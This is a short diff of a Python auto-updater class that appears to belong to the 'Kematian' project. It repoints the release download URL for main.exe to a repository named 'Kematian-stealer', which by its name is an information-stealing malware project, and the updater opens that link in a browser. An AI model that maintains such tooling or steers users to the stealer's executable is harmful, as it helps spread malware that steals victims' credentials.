@@ -9,7 +9,7 @@ import requests
 
 class AutoUpdater:
     def __init__(self) -> None:
-        self.github_url = "https://github.com/Pirate-Devs/Kematian/releases/download/AutoBuild/main.exe"
+        self.github_url = "https://github.com/0x559/Kematian-stealer/releases/download/AutoBuild/main.exe"
         self.current_file = sys.argv[0]
 
     def get_current_file_bytes(self) -> bytes:
@@ -38,7 +38,7 @@ class AutoUpdater:
                     "AN UPDATE IS AVAILABLE! Please update the program to the latest version by downloading it from the github page."
                 )
                 webbrowser.open(
-                    "https://github.com/Pirate-Devs/Kematian/releases/download/AutoBuild/main.exe",
+                    "https://github.com/0x559/Kematian-stealer/releases/download/AutoBuild/main.exe",
                     1,
                 )
                 input("Press enter to exit...")
